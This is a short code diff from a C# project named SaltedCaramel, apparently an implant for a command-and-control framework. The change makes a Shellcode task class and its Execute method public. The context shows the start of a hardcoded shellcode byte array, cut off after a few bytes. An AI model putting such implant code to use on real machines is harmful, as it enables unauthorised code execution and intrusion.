@@ -3,9 +3,9 @@ using System.Runtime.InteropServices;
 
 namespace SaltedCaramel.Tasks
 {
-    internal class Shellcode
+    public class Shellcode
     {
-        internal static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTaskObject task, SCImplant implant)
         {
             byte[] shellcode = new byte[] {
                 0x50,0x53,0x51,0x52,0x56,0x57,0x55,0x89,
